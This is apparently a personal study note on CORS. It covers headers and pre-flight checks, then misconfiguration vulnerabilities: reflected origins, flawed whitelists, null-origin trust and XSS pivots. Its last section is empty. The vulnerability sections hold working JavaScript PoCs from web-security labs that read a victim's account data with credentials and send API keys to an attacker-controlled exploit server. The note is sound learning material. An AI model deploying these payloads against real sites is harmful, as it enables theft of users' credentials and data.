-------------

### Understanding Cross Origin Sharing

-------------

- It is a browser mechanism that grants permission control to a resource outside of a domain.It grants flexibility as against Same-Origin Policy(SOP).It provides potential for cross domain attacks if poorly configured.
- CORS is not a protection against cross-origin attacks such as cross-site request forgery (CSRF).
- Same-Origin policy limits the way a website interact with resources outside its domain.The same-origin policy was defined many years ago in response to potentially malicious cross-domain interactions, such as one website stealing private data from another. It generally allows a domain to issue requests to other domains, but not to access the responses.
- A controlled relaxation of the same-origin policy is possible using cross-origin resource sharing (CORS).The cross-origin resource sharing protocol uses a suite of HTTP headers that define trusted web origins and associated properties such as whether authenticated access is permitted. These are combined in a header exchange between a browser and the cross-origin web site that it is trying to access.

------------

### CORS and Access-Control-Allow-Origin headers

------------

- Access-Control-Allow-Origin response header is included in the response from a website to a requesting website and identifies the permitting origin of the website.

------------

### Implementing simple cross-origin resource sharing

------------

- The cross-origin resource sharing (CORS) specification prescribes header content exchanged between web servers and browsers that restricts origins for web resource requests outside of the origin domain.
- For example, suppose a website with origin normal-website.com causes the following cross-domain request:
```http
GET /data HTTP/1.1
Host: robust-website.com
Origin : https://normal-website.com
```
-  The server on `robust-website.com` will return this response

```http
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://normal-website.com
```

- The browser will allow access to the resource because the `Origin` header matches the `Access-Control-Allow-Origin` specified in the response.The specification of Access-Control-Allow-Origin allows for multiple origins, or the value null, or the wildcard *. However, no browser supports multiple origins and there are restrictions on the use of the wildcard *.Values allowed-:

```
null
*
```

---------------

### Handling Cross Origin request with credentials

--------------

- The default behavior of cross-origin resource requests is for requests to be passed without credentials like cookies and the Authorization header. However, the cross-domain server can permit reading of the response when credentials are passed to it by setting the CORS Access-Control-Allow-Credentials header to true. Now if the requesting website uses JavaScript to declare that it is sending cookies with the request.
- If the website uses javascript to send cookies

```http
GET /data HTTP/1.1
Host: robust-website.com
...
Origin: https://normal-website.com
Cookie: JSESSIONID=<value>
```

- And the response to the request is-:

```http
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Credentials: true
```

- The browser will allow the requesting website to read the response because `Access-Control-Allow-Credentials` is set to `true`.Otherwise, it will not allow the response.


--------------

### Relaxation of CORS with wildcards

-------------

- The `Access-Control-Allow-Origin` allows wildcards `*`.

```http
Access-Control-Allow-Credentials: true
```
-  Also, the use of wildcard `*` with transfer of credentials `Access-Control-Allow-Credentials: true` is disallowed as this would be dangerously insecure, exposing any authenticated content on the target site to everyone.Given these constraints, some web servers dynamically create Access-Control-Allow-Origin headers based upon the client-specified origin. This is a workaround for CORS constraints that is not secure.

-------------

### Pre-flight Requests

------------

- The pre-flight check was added to the CORS specification to protect legacy resources from the expanded request options allowed by CORS.Under certain circumstances, when a cross-domain request includes a non-standard HTTP method or headers, the cross-origin request is preceded by a request using the `OPTIONS` method, and the CORS protocol necessitates an initial check on what methods and headers are permitted prior to allowing the cross-origin request. This is called the pre-flight check.The server returns a list of allowed methods in addition to the trusted origin and the browser checks to see if the requesting website's method is allowed.
- For example, this is a pre-flight request that is seeking to use the PUT method together with a custom request header called Special-Request-Header:

```http
OPTIONS /data HTTP/1.1
Host: <some website>
...
Origin: https://normal-website.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Special-Request-Header
```
- Probable response-:

```http
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Special-Request-Header
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```

- This response sets out the allowed methods (PUT, POST and OPTIONS) and permitted request headers (Special-Request-Header). In this particular case the cross-domain server also allows the sending of credentials, and the Access-Control-Max-Age header defines a maximum timeframe for caching the pre-flight response for reuse. If the request methods and headers are permitted (as they are in this example) then the browser processes the cross-origin request in the usual way. Pre-flight checks add an extra HTTP request round-trip to the cross-domain request, so they increase the browsing overhead.

------------

### Vulnerabilities on CORS

------------

### Server Side generated `Access-Control-Allow-origin` header from Client's request

------------

- Some applications need to provide access to a number of other domains. Maintaining a list of allowed domains requires ongoing effort, and any mistakes risk breaking functionality. So some applications take the easy route of effectively allowing access from any other domain.One way to do this is by reading the Origin header from requests and including a response header stating that the requesting origin is allowed. For example, consider an application that receives the following request:

```
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```

- Response-:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
```

- These headers state that access is allowed from the requesting domain (malicious-website.com) and that the cross-origin requests can include cookies (Access-Control-Allow-Credentials: true) and so will be processed in-session.
- Because the application reflects arbitrary origins in the Access-Control-Allow-Origin header, this means that absolutely any domain can access resources from the vulnerable domain. If the response contains any sensitive information such as an API key or CSRF token, you could retrieve this by placing the following script on your website:

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='//malicious-website.com/log?key='+this.responseText;
};
```
- CORS with basic origin relection-:
- CSRF POC-:

```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0a23005b03c79d758046a3b900ae0022.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
function reqListener() {
      var data =  JSON.parse(this.responseText);
      var api_key =  data.apikey;
	location='//exploit-0aa200f703149d1080e1a274013200d6.exploit-server.net/?key='+api_key;
};
</script>
<meta name="referrer" content="never">
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```

- In action-:

![image](https://github.com/user-attachments/assets/4e2516f7-5789-4eab-a738-05367c6b2ec9)


------------

### Error parsing Origin Headers

-----------

- Some applications that support access from multiple origins do so by using a whitelist of allowed origins. When a CORS request is received, the supplied origin is compared to the whitelist. If the origin appears on the whitelist then it is reflected in the Access-Control-Allow-Origin header so that access is granted. For example, the application receives a normal request like:

```http
GET /data HTTP/1.1
Host: normal-website.com
Origin: https://innocent-website.com
```

- Response:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://innocent-website.com
```

- Mistakes often arise when implementing CORS origin whitelists. Some organizations decide to allow access from all their subdomains (including future subdomains not yet in existence). And some applications allow access from various other organizations' domains including their subdomains. These rules are often implemented by matching URL prefixes or suffixes, or using regular expressions. Any mistakes in the implementation can lead to access being granted to unintended external domains.Probably the regex rule-:

```
*.sensei.com
```

- A site might grant access to all subdomains registered under domain `normal-user.com`.An hacker might get a domain with `hackersnormal-website.com`.
- Alternatively, suppose an application grants access to all domains beginning with

```
normal-website.com
```

- An hacker might gain access with the site.

```
normal-website.com.evil-user.net
```

----------

### Whitelisted Origin Null value

-----------

- The origin header supports the `null` value.Although, browsers might send it in some circumstances.For example,
 - Cross-Origin redirects
 - Requests from serialized data
 - Request using the `file:` protocol
 - Sandboxed cross origin requests

- Payload to trigger it-:

```javascript
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```

- CORS origin with trusted null whitelist-:
- CSRF POC-:

```html
<!--Payload 2-->
<meta name="referrer" content="never">
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
      var req = new XMLHttpRequest();
      req.onload = reqListener;
      req.open('get','https://0ab300f00420f33881e289fd00e10007.web-security-academy.net/accountDetails',true);
      req.withCredentials = true;
      req.send();
      
      function reqListener() {
      var data =  JSON.parse(this.responseText);
      var api_key =  data.apikey;      
      location='https://exploit-0a6100780480f311814e8889018a000e.exploit-server.net/log?key='+api_key;
      };
      </script>"></iframe>
```

- Proof of concept-:

![image](https://github.com/user-attachments/assets/a5d3813b-f284-44a9-bf33-75ac34d8ca11)
 

-----------

### Exploiting XSS via CORS trust relationships

------------

-Even "correctly" configured CORS establishes a trust relationship between two origins. If a website trusts an origin that is vulnerable to cross-site scripting (XSS), then an attacker could exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information from the site that trusts the vulnerable application.

- Given the following request:
```http
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...
```
- Response-:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

- Then an attacker who finds an XSS vulnerability on subdomain.vulnerable-website.com could use that to retrieve the API key, using a URL like:

```url
https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
```

------------

### Breaking TLS  with poorly configured CORS

------------

- 



------------

